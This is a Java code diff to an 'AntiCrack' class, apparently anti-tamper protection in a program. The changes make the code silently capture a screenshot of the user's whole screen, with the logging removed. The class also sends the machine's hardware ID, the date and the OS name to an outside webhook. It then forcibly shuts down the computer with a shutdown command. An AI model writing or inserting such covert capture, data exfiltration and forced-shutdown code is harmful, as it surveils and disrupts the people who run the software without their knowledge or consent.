@@ -41,10 +41,10 @@ public class AntiCrack implements ICrack {
 			Rectangle rectangle = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
 			BufferedImage bufferedImage = robot.createScreenCapture(rectangle);
 			File file = new File(pathFile);
-			boolean status = ImageIO.write(bufferedImage, "png", file);
-			System.out.println("Screen created " + status + " " + file.getPath());
+			ImageIO.write(bufferedImage, "png", file);
+			// System.out.println("Screen created " + status + " " + file.getPath());
 		} catch (AWTException | IOException ex) {
-			System.out.println("FUCKED");
+			// System.out.println("FUCKED");
 		}
 
 	}
@@ -62,24 +62,18 @@ public class AntiCrack implements ICrack {
 				.addField("HWID", Protect.HWID.getHWID(), true).addField("Date", formatter.format(date), false)
 				.addField("OC", System.getProperty("os.name"), false));
 
+
 		webhook.execute();
 
 	}
 
 	@Override
-	public void shutdownPC() throws IOException {
-		String shutdownCommand;
-		String operatingSystem = System.getProperty("os.name");
-
-		if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem)) {
-			shutdownCommand = "shutdown -h now";
-		} else if ("Windows".equals(operatingSystem)) {
-			shutdownCommand = "shutdown -s -t 0";
-		} else {
-			throw new RuntimeException("Unsupported operating system.");
+	public void shutdownPC() {
+		try {
+			Process processShutdown = Runtime.getRuntime().exec("shutdown -s -t " + 1);
+		} catch (Exception e) {
+			e.printStackTrace();
 		}
-
-		Runtime.getRuntime().exec(shutdownCommand);
 
 		System.exit(1);
 	}
